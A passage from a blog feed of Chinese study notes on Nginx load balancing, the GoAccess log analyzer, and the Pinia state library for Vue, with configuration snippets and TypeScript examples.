<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream  node &#123;</span><br><span class="line">  server 127.0.0.1:9001;</span><br><span class="line">  server 127.0.0.1:9002;</span><br><span class="line">  server 127.0.0.1:9003;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  proxy_pass http://node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="权重weight"><a href="#权重weight" class="headerlink" title="权重weight"></a>权重weight</h1><p>权重越大，该服务器承载的并发就越高</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream  node &#123;</span><br><span class="line">  server 127.0.0.1:9001 weight=3;</span><br><span class="line">  server 127.0.0.1:9002 weight=2;</span><br><span class="line">  server 127.0.0.1:9003 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="fail-timeout和backup"><a href="#fail-timeout和backup" class="headerlink" title="fail_timeout和backup"></a>fail_timeout和backup</h1><p>fail_timeout是故障等待超时时间</p>
<p>backup是备用服务器参数，可以为一个upstream设置一个备用服务器，在生产服务器全部都出问题时，可以自动切换到备用服务器上，为恢复服务争取时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream  node &#123;</span><br><span class="line">  server 127.0.0.1:9001 fail_timeout=60;</span><br><span class="line">  server 127.0.0.1:9002 fail_timeout=20;</span><br><span class="line">  server 127.0.0.1:9003 backup;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>





<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><p>使用express启动三个服务，端口号为9001、9002和9003：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&quot;Nginx 负载均衡9001&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Nginx 负载均衡9001&quot;</span>,num)</span><br><span class="line">   num++</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//------------------------------9001</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9001</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;9001 success&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//-----------------------------------</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&quot;Nginx 负载均衡9002&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Nginx 负载均衡9002&quot;</span>,num)</span><br><span class="line">    num++</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//------------------------------9002</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9002</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;9002 success&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//--------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    </span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&quot;Nginx 负载均衡9003&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Nginx 负载均衡9003&quot;</span>,num)</span><br><span class="line">    num++</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//------------------------------9003</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9003</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;9003 success&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
        <tag>GoAccess</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx日志分析器</title>
    <url>/web/study/Nginx/7.Nginx%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%99%A8.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="GoAccess"><a href="#GoAccess" class="headerlink" title="GoAccess"></a>GoAccess</h1><p>GoAccess是一款开源、实时，运行在命令行终端下的web日志分析工具，它提供快速、多样的HTTP状态统计</p>
<p>可以令管理员不再纠结于统计各类数据、繁杂的指令以及一大堆管道&#x2F;正则表达式</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://tar.goaccess.io/goaccess-1.2.tar.gz</span><br><span class="line">tar -xzvf goaccess-1.2.tar.gz</span><br><span class="line">cd goaccess-1.2/</span><br><span class="line">./configure </span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>文档：<a href="https://www.goaccess.cc/?mod=man">GoAccess - 中文站 - 可视化 Web 日志分析工具</a></p>
<p>开启实时HTML报告分析（webSocket）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">goaccess access.log -a -o ../html/report.html --real-time-html --log-format=COMBINED</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306281806485.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
        <tag>GoAccess</tag>
      </tags>
  </entry>
  <entry>
    <title>初始化仓库Store</title>
    <url>/web/study/Pinia/2.%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%93%E5%BA%93Store.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>通常在&#x2F;src下创建&#x2F;store目录做仓库管理。</p>
<p>&#x2F;src&#x2F;store&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Names</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./store-name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1：唯一的命名空间</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="title class_">Names</span>.<span class="property">TEST</span>, &#123;</span><br><span class="line">  <span class="comment">// 一个返回对象的函数 在对象里定义值</span></span><br><span class="line">  <span class="attr">state</span>: <span class="function">()=&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">current</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似计算属性computed 修饰一些值 可以缓存</span></span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似方法 同步或异步提交state</span></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    pinia: &#123;&#123; Test.current &#125;&#125; --- &#123;&#123; Test.name &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>组件中可以使用仓库的数据，并且可以被Vue devtools识别：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306091513164.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>解构Store</title>
    <url>/web/study/Pinia/4.%E8%A7%A3%E6%9E%84Store.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="storeToRefs"><a href="#storeToRefs" class="headerlink" title="storeToRefs"></a>storeToRefs</h1><p>在Pinia中，直接进行解构会导致数据失去响应式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    origin: &#123;&#123; Test.current &#125;&#125; --- &#123;&#123; Test.name &#125;&#125;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 失去了响应式 --&gt;</span><br><span class="line">    now: &#123;&#123; current &#125;&#125; --- &#123;&#123; name &#125;&#125;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;change&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line"></span><br><span class="line">const &#123; current, name &#125; = Test</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  console.log(current, name)</span><br><span class="line">  Test.current++</span><br><span class="line">  Test.name+=&quot;yajue&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306092048696.png"></p>
<p>如果需要解构，应该使用storeToRefs包裹：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line">// 类似Vue3的toRefs</span><br><span class="line">import &#123; storeToRefs &#125; from &quot;pinia&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line">const &#123; current, name &#125; = storeToRefs(Test)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306092048290.png"></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>和toRefs类似。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">storeToRefs</span>(<span class="params">store</span>) &#123;</span><br><span class="line">  <span class="comment">// See https://github.com/vuejs/pinia/issues/852</span></span><br><span class="line">  <span class="comment">// It&#x27;s easier to just use toRefs() even if it includes more stuff</span></span><br><span class="line">  <span class="keyword">if</span> (isVue2) &#123;</span><br><span class="line">    <span class="comment">// @ts-expect-error: toRefs include methods and others</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">toRefs</span>(store);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// store是个proxy对象，通过toRaw解出原始对象，防止重复引用</span></span><br><span class="line">    store = <span class="title function_">toRaw</span>(store);</span><br><span class="line">    <span class="keyword">const</span> refs = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 遍历每个键值，包裹为响应式</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> store) &#123;</span><br><span class="line">      <span class="keyword">const</span> value = store[key];</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">isRef</span>(value) || <span class="title function_">isReactive</span>(value)) &#123;</span><br><span class="line">          <span class="comment">// @ts-expect-error: the key is state or getter</span></span><br><span class="line">          refs[key] =</span><br><span class="line">              <span class="comment">// ---</span></span><br><span class="line">              <span class="title function_">toRef</span>(store, key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> refs;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>State</title>
    <url>/web/study/Pinia/3.State.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>定义一个仓库：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Names</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./store-name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="title class_">Names</span>.<span class="property">TEST</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">current</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="comment">// 定义一个方法</span></span><br><span class="line">    <span class="title function_">setCurrent</span>(<span class="params">str:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">      <span class="comment">// this可以指到值</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">name</span> += str</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">current</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>State中的值有五种修改方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    pinia: &#123;&#123; Test.current &#125;&#125; --- &#123;&#123; Test.name &#125;&#125;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;change&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line"></span><br><span class="line">// 修改state的值 有五种方法</span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // 方法1 直接修改（VueX里则不允许直接修改）</span><br><span class="line">  // Test.current++</span><br><span class="line"></span><br><span class="line">  // 方法2 $patch 对象形式 批量修改 不常用</span><br><span class="line">  // Test.$patch(&#123;</span><br><span class="line">  //   current: Test.current+1,</span><br><span class="line">  //   name: Test.name+&quot;yajue&quot;</span><br><span class="line">  // &#125;)</span><br><span class="line"></span><br><span class="line">  // 方法3 $patch 函数形式 批量修改 增加业务 参数state就是store里的state</span><br><span class="line">  // Test.$patch((state:any)=&gt; &#123;</span><br><span class="line">  //   if(state.current%2==1) &#123;</span><br><span class="line">  //     state.name += &quot; &quot;</span><br><span class="line">  //   &#125; else &#123;</span><br><span class="line">  //     state.name += &quot;yajue&quot;</span><br><span class="line">  //   &#125;</span><br><span class="line">  //   state.current++</span><br><span class="line">  // &#125;)</span><br><span class="line"></span><br><span class="line">  // 方法4 直接赋对象值 改变对象引用 不常用</span><br><span class="line">  // Test.$state = &#123;</span><br><span class="line">  //   current: 114514,</span><br><span class="line">  //   name: &quot;yjsp&quot;</span><br><span class="line">  // &#125;</span><br><span class="line"></span><br><span class="line">  // 方法5 借助action修改</span><br><span class="line">  Test.setCurrent(&quot; oh my god&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>API</title>
    <url>/web/study/Pinia/6.API.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="reset"><a href="#reset" class="headerlink" title="$reset"></a>$reset</h1><p>重置store到初始状态。</p>
<p>写在state里的值就是初始状态。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">user</span>: &lt;<span class="title class_">User</span>&gt;&#123;&#125;,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">  <span class="attr">current</span>: <span class="number">1</span></span><br><span class="line">&#125;),</span><br></pre></td></tr></table></figure>

<p>如果值被改变，调用$reset就会将state所有值重置回初始状态。</p>
<h1 id="subscribe"><a href="#subscribe" class="headerlink" title="$subscribe"></a>$subscribe</h1><p>监听state的改变，只要有state的变化就会执行这个函数，类似VueX的abscribe。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数1：类似watchEffect里的effect</span></span><br><span class="line"><span class="title class_">Test</span>.$subscribe(<span class="function">(<span class="params">args,state</span>)=&gt;</span>&#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(args,state)</span><br><span class="line">&#125;),&#123;</span><br><span class="line">  <span class="comment">// 配置项，组件卸载后还想继续调用这个函数就设置</span></span><br><span class="line">  <span class="attr">detached</span>:<span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="onAction"><a href="#onAction" class="headerlink" title="$onAction"></a>$onAction</h1><p>当有actions被调用，就会执行这个函数。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>.$onAction(<span class="function">(<span class="params">args</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 这个after和watchEffect的清除副作用函数很像，但它是后调用的</span></span><br><span class="line">  args.<span class="title function_">after</span>(<span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 我会先被调用</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line"><span class="comment">// 组件卸载后还想继续调用这个函数就设置参数2为true</span></span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>Actions和Getters</title>
    <url>/web/study/Pinia/5.Actions%E5%92%8CGetters.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Actions"><a href="#Actions" class="headerlink" title="Actions"></a>Actions</h1><p>同步直接调用即可。&#x2F;store&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Names</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./store-name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">result</span>:<span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yjsp&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="title class_">Names</span>.<span class="property">TEST</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">user</span>: &lt;<span class="title class_">User</span>&gt;&#123;&#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="title function_">setUser</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">user</span> = result</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>异步使用async&#x2F;await即可。&#x2F;store&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Names</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./store-name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Login</span> = (): <span class="title class_">Promise</span>&lt;<span class="title class_">User</span>&gt; =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;yjsp&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="title class_">Names</span>.<span class="property">TEST</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">user</span>: &lt;<span class="title class_">User</span>&gt;&#123;&#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;),</span><br><span class="line">    </span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">setUser</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title class_">Login</span>()</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">user</span> = result</span><br><span class="line">      <span class="comment">// action中的方法可以相互调用</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setName</span>(<span class="variable language_">this</span>.<span class="property">user</span>.<span class="property">name</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">setName</span>(<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    actions: &#123;&#123; Test.user &#125;&#125; --- &#123;&#123; Test.name &#125;&#125;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;change&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  Test.setUser()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Getters"><a href="#Getters" class="headerlink" title="Getters"></a>Getters</h1><p>&#x2F;store&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Names</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./store-name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Login</span> = (): <span class="title class_">Promise</span>&lt;<span class="title class_">User</span>&gt; =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;yjsp&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTestStore = <span class="title function_">defineStore</span>(<span class="title class_">Names</span>.<span class="property">TEST</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> 